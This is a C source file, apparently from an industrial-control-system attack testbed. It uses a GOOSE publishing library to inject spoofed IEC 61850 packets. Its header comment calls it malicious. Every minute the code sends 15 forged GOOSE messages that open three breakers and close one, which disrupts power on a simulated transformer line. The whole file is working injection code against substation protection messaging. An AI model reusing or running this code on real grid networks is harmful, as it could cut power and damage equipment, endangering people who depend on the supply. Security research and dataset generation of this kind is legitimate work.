/*
 * goose_publisher_PIOC_8113
 
#####################################################################################################################################################

Malicious behaviour:

Network level: Except the Benign publisher program, this malicious program will be also running and publishing 15 GOOSE packets (1,4,16,64,256,1000ms heartbeat) mal_Pub_XFMR1 (1110: open CB1_66KV, CB2_66KV, CB_XFMR1, close CB2_22KV) to physcial process (Simulink) under normal operation every 1 min

Physical process level:There will be a 9-second energy disruption every 1 min on Transformer1 line.

#####################################################################################################################################################
*/

#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <stdbool.h>
#include <stdio.h>
#include <math.h>
#include <unistd.h>

#include "mms_value.h"
#include "goose_publisher.h"
#include "hal_thread.h"

//#######Define the attack settings #########//

//The frequency (every x minutes) of attack behaviours
#define period 1
//The number of packets in one period
#define No_pkts 15



// has to be executed as root!
int
main(int argc, char** argv)
{
    char* interface;
   	//The Heartbeat of the first injecting packet (millisecond)
	int HB = 1; 
    
    if (argc > 1)
       interface = argv[1];
    else
       interface = "enp0s8";

    printf("Using interface %s\n", interface);
	
	CommParameters gooseCommParameters;

	gooseCommParameters.appId = 0x3101;
	gooseCommParameters.dstAddress[0] = 0x01;
	gooseCommParameters.dstAddress[1] = 0x0c;
	gooseCommParameters.dstAddress[2] = 0xcd;
	gooseCommParameters.dstAddress[3] = 0x01;
	gooseCommParameters.dstAddress[4] = 0x0c;
	gooseCommParameters.dstAddress[5] = 0x01;
	gooseCommParameters.vlanId = 0;
	gooseCommParameters.vlanPriority = 4;

	/*
	 * Create a new GOOSE publisher instance. As the second parameter the interface
	 * name can be provided (e.g. "eth0" on a Linux system). If the second parameter
	 * is NULL the interface name as defined with CONFIG_ETHERNET_INTERFACE_ID in
	 * stack_config.h is used.
	 */
	 
	GoosePublisher publisher = GoosePublisher_create(&gooseCommParameters, interface);
	MmsValue* quality = MmsValue_newBitString(13); // Create bit-string with 13 0s

	if (publisher) {
		GoosePublisher_setGoCbRef(publisher, "QUTZS_XFMR1PIOC/LLN0$GO$gcb_1");
	    GoosePublisher_setTimeAllowedToLive(publisher, 1100);    
	    GoosePublisher_setDataSetRef(publisher, "QUTZS_XFMR1PIOC/LLN0$DS_XFMR");
	    GoosePublisher_setGoID(publisher , "gcb_1");
	    GoosePublisher_setConfRev(publisher, 200);
	    
	    while (1) {	    	
	    	LinkedList dataSetValues = LinkedList_create();
	    	
			for (int i = 0; i <3; i++ ) {
				LinkedList_add(dataSetValues, MmsValue_newBoolean(true));
				LinkedList_add(dataSetValues, quality);
			}
			LinkedList_add(dataSetValues, MmsValue_newBoolean(false));
			LinkedList_add(dataSetValues, quality);
			
			Thread_sleep(period*60000);
		
			for (int i = 0; i <No_pkts; i++ ) {
				if (HB <999) {		
					GoosePublisher_publish(publisher, dataSetValues);
					Thread_sleep(HB);
					HB = HB*4;
				}
				else {
					GoosePublisher_publish(publisher, dataSetValues);
					Thread_sleep(1000);
				}
			}
			HB = 1; //reset HB 
			    	 
			LinkedList_destroyStatic(dataSetValues);
		}
	
		GoosePublisher_destroy(publisher);
	}
	else {
		printf("Failed to create GOOSE publisher. Reason can be that the Ethernet interface doesn't exist or root permission are required.\n");
	}
    	
}